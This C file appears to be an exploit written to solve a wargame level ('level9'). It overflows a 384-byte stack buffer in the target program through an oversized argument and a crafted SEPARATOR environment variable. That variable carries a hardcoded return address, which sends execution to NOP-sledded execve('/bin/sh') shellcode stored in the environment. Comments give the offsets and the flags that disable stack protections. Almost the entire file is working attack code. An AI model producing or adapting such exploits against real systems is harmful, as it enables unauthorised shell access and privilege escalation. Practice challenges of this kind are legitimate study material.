#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#define NOP 0x90
#define VULN "/var/challenge/level9/9"

char shellcode [] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";


char separator [] = "SEPARATOR=\xbd\xff\xff\xbf\x30\x30\x30\x30\x31\x31\x31\x31\x32\x32\x32\x32\x33\x33\x33\x33\x34\x34\x34\x34\x35\x35\x35\x35\xbd\xff\xff\xbf";

/**
* Buffer overflow with 23 byte bin/sh shellcode
* Shellcode in env using address ~0xbfffffbc (included NOP sled to avoid exact calculation)
* Compiler flags -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
*
* Target buffer of 384 bytes.  384 bytes inserted as argument, 28 through SEPARATOR env variable (retrieved by target program).
*
* Vulnerable program takes SEPARATOR from the environment, that allows us to overflow the buffer
* The return address is 24 bytes ahead of the buffer
* Must input a valid address just after the separator as the program expects it
* v4l3r0n
**/


char * string_repeat( int n, const char * s ) {
  size_t slen = strlen(s);
  char * dest = malloc(n*slen+1);
 
  int i; char * p;
  for ( i=0, p = dest; i < n; ++i, p += slen ) {
    memcpy(p, s, slen);
  }
  return dest;
}

int main(void){

	unsigned int addr, i, offset = 0;	
	
	char *arg3 = string_repeat(384,"1");
	
	char *params [] = {VULN,"2","30",arg3,NULL};

	char *env [] = {separator,shellcode, NULL};

	execve(params[0],params,env);
	perror("execve");
	exit(1);

}
